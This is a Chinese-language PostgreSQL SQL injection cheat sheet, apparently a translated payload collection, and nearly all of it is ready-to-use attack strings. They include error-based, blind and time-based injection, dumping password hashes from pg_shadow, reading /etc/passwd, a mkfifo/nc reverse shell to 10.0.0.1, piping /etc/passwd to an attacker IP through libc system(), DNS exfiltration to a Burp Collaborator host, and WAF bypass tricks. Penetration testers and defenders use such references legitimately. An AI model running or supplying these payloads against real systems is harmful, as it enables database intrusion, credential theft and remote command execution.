# PostgreSQL 注入

> PostgreSQL SQL 注入是指一种安全漏洞，攻击者利用未正确清理的用户输入在 PostgreSQL 数据库中执行未经授权的 SQL 命令。

## 目录

- [PostgreSQL 注释](#postgresql-comments)
- [PostgreSQL 枚举](#postgresql-enumeration)
- [PostgreSQL 方法论](#postgresql-methodology)
- [基于错误的 PostgreSQL 注入](#postgresql-error-based)
    - [PostgreSQL XML 辅助函数](#postgresql-xml-helpers)
- [PostgreSQL 盲注](#postgresql-blind)
    - [使用子串等效项的 PostgreSQL 盲注](#postgresql-blind-with-substring-equivalent)
- [基于时间的 PostgreSQL 注入](#postgresql-time-based)
- [PostgreSQL 带外注入 (OOB)](#postgresql-out-of-band)
- [PostgreSQL 堆叠查询](#postgresql-stacked-query)
- [PostgreSQL 文件操作](#postgresql-file-manipulation)
    - [PostgreSQL 文件读取](#postgresql-file-read)
    - [PostgreSQL 文件写入](#postgresql-file-write)
- [PostgreSQL 命令执行](#postgresql-command-execution)
    - [使用 COPY TO/FROM PROGRAM](#using-copy-tofrom-program)
    - [使用 libc.so.6](#using-libcso6)
- [PostgreSQL WAF 绕过](#postgresql-waf-bypass)
    - [引号的替代方案](#alternative-to-quotes)
- [PostgreSQL 权限](#postgresql-privileges)
    - [PostgreSQL 列出权限](#postgresql-list-privileges)
    - [PostgreSQL 超级用户角色](#postgresql-superuser-role)
- [参考资料](#references)

## PostgreSQL 注释

| 类型                | 注释 |
| ------------------- | ------- |
| 单行注释 | `--`    |
| 多行注释  | `/**/`  |

## PostgreSQL 枚举

| 描述            | SQL 查询                               |
| ---------------------- | --------------------------------------- |
| DBMS 版本           | `SELECT version()`                      |
| 数据库名称          | `SELECT CURRENT_DATABASE()`             |
| 数据库架构 (Schema)        | `SELECT CURRENT_SCHEMA()`               |
| 列出 PostgreSQL 用户  | `SELECT usename FROM pg_user`           |
| 列出密码哈希   | `SELECT usename, passwd FROM pg_shadow` |
| 列出数据库管理员 | `SELECT usename FROM pg_user WHERE usesuper IS TRUE` |
| 当前用户           | `SELECT user;`                          |
| 当前用户           | `SELECT current_user;`                  |
| 当前用户           | `SELECT session_user;`                  |
| 当前用户           | `SELECT usename FROM pg_user;`          |
| 当前用户           | `SELECT getpgusername();`               |

## PostgreSQL 方法论

| 描述            | SQL 查询                                    |
| ---------------------- | -------------------------------------------- |
| 列出架构 (Schemas)           | `SELECT DISTINCT(schemaname) FROM pg_tables` |
| 列出数据库         | `SELECT datname FROM pg_database`            |
| 列出表            | `SELECT table_name FROM information_schema.tables` |
| 列出表            | `SELECT table_name FROM information_schema.tables WHERE table_schema='<SCHEMA_NAME>'` |
| 列出表            | `SELECT tablename FROM pg_tables WHERE schemaname = '<SCHEMA_NAME>'` |
| 列出列           | `SELECT column_name FROM information_schema.columns WHERE table_name='data_table'` |

## 基于错误的 PostgreSQL 注入

| 名称         | Payload (载荷)         |
| ------------ | --------------- |
| CAST | `AND 1337=CAST('~'\|\|(SELECT version())::text\|\|'~' AS NUMERIC) -- -` |
| CAST | `AND (CAST('~'\|\|(SELECT version())::text\|\|'~' AS NUMERIC)) -- -` |
| CAST | `AND CAST((SELECT version()) AS INT)=1337 -- -` |
| CAST | `AND (SELECT version())::int=1 -- -` |

```sql
CAST(chr(126)||VERSION()||chr(126) AS NUMERIC)
CAST(chr(126)||(SELECT table_name FROM information_schema.tables LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)--
CAST(chr(126)||(SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset)||chr(126) AS NUMERIC)--
CAST(chr(126)||(SELECT data_column FROM data_table LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)
```

```sql
' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1
' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1
' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1
' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1
```

### PostgreSQL XML 辅助函数

```sql
SELECT query_to_xml('select * from pg_user',true,true,''); -- 以单个 XML 行的形式返回所有结果
```

上面的 `query_to_xml` 会将指定查询的所有结果作为单个结果返回。将其与[基于错误的 PostgreSQL 注入](#postgresql-error-based)技术结合使用即可提取数据，而无需担心将查询限制 (`LIMIT`) 为一个结果。

```sql
SELECT database_to_xml(true,true,''); -- 将当前数据库转储为 XML
SELECT database_to_xmlschema(true,true,''); -- 将当前数据库转储为 XML Schema
```

注意，使用上述查询时，需要在内存中组装输出。对于较大的数据库，这可能会导致速度变慢或触发拒绝服务状态。

## PostgreSQL 盲注

### 使用子串等效项的 PostgreSQL 盲注

| 函数    | 示例                                         |
| ----------- | ----------------------------------------------- |
| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`           |
| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)`        |
| `SUBSTRING` | `SUBSTRING('foobar' FROM <START> FOR <LENGTH>)` |

示例：

```sql
' and substr(version(),1,10) = 'PostgreSQL' and '1  -- TRUE (为真)
' and substr(version(),1,10) = 'PostgreXXX' and '1  -- FALSE (为假)
```

## 基于时间的 PostgreSQL 注入

### 识别延时注入

```sql
select 1 from pg_sleep(5)
;(select 1 from pg_sleep(5))
||(select 1 from pg_sleep(5))
```

### 基于时间的数据库转储

```sql
select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1
```

### 基于时间的数据表转储

```sql
select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1
```

### 基于时间的列转储

```sql
select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1
select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1
```

```sql
AND 'RANDSTR'||PG_SLEEP(10)='RANDSTR'
AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
```

## PostgreSQL 带外注入 (OOB)

PostgreSQL 中的带外 SQL 注入依赖于使用能够与文件系统或网络交互的函数，例如 `COPY`、`lo_export` 或来自扩展的可执行网络操作的函数。其核心思想是利用数据库将数据发送到其他地方，以便攻击者进行监控和拦截。

```sql
declare c text;
declare p text;
begin
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f();
```

## PostgreSQL 堆叠查询

使用分号“`;`”添加另一个查询

```sql
SELECT 1;CREATE TABLE NOTSOSECURE (DATA VARCHAR(200));--
```

## PostgreSQL 文件操作

### PostgreSQL 文件读取

注意：早期版本的 Postgres 在 `pg_read_file` 或 `pg_ls_dir` 中不接受绝对路径。较新版本（截至 [0fdc8495bff02684142a44ab3bc5b18a8ca1863a](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) 提交）将允许超级用户或 `default_role_read_server_files` 组中的用户读取任何文件/文件路径。

- 使用 `pg_read_file`, `pg_ls_dir`

    ```sql
    select pg_ls_dir('./');
    select pg_read_file('PG_VERSION', 0, 200);
    ```

- 使用 `COPY`

    ```sql
    CREATE TABLE temp(t TEXT);
    COPY temp FROM '/etc/passwd';
    SELECT * FROM temp limit 1 offset 0;
    ```

- 使用 `lo_import`

    ```sql
    SELECT lo_import('/etc/passwd'); -- 将从文件创建一个大对象并返回 OID
    SELECT lo_get(16420); -- 使用上述返回的 OID
    SELECT * from pg_largeobject; -- 或者直接获取所有大对象及其数据
    ```

### PostgreSQL 文件写入

- 使用 `COPY`

    ```sql
    CREATE TABLE nc (t TEXT);
    INSERT INTO nc(t) VALUES('nc -lvvp 2346 -e /bin/bash');
    SELECT * FROM nc;
    COPY nc(t) TO '/tmp/nc.sh';
    ```

- 使用 `COPY`（单行）

    ```sql
    COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';
    ```

- 使用 `lo_from_bytea`, `lo_put` 和 `lo_export`

    ```sql
    SELECT lo_from_bytea(43210, 'your file data goes in here'); -- 创建一个 OID 为 43210 并包含一些数据的大对象
    SELECT lo_put(43210, 20, 'some other data'); -- 在偏移量 20 处将数据追加到大对象
    SELECT lo_export(43210, '/tmp/testexport'); -- 将数据导出到 /tmp/testexport
    ```

## PostgreSQL 命令执行

### 使用 COPY TO/FROM PROGRAM

运行 Postgres 9.3 及更高版本的安装具有允许超级用户和具有 '`pg_execute_server_program`' 权限的用户使用 `COPY` 管道输入和输出外部程序的功能。

```sql
COPY (SELECT '') TO PROGRAM 'getent hosts $(whoami).[BURP_COLLABORATOR_DOMAIN_CALLBACK]';
COPY (SELECT '') to PROGRAM 'nslookup [BURP_COLLABORATOR_DOMAIN_CALLBACK]'
```

```sql
CREATE TABLE shell(output text);
COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f';
```

### 使用 libc.so.6

```sql
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');
```

## PostgreSQL WAF 绕过

### 引号的替代方案

| Payload (载荷)            | 技术 |
| ------------------ | --------- |
| `SELECT CHR(65)\|\|CHR(66)\|\|CHR(67);` | 来自 `CHR()` 的字符串 |
| `SELECT $TAG$This` | 美元符号（>= 版本 8 PostgreSQL）   |

## PostgreSQL 权限

### PostgreSQL 列出权限

检索当前用户的所有表级权限，不包括 `pg_catalog` 和 `information_schema` 等系统架构中的表。

```sql
SELECT * FROM information_schema.role_table_grants WHERE grantee = current_user AND table_schema NOT IN ('pg_catalog', 'information_schema');
```

### PostgreSQL 超级用户角色

```sql
SHOW is_superuser; 
SELECT current_setting('is_superuser');
SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;
```

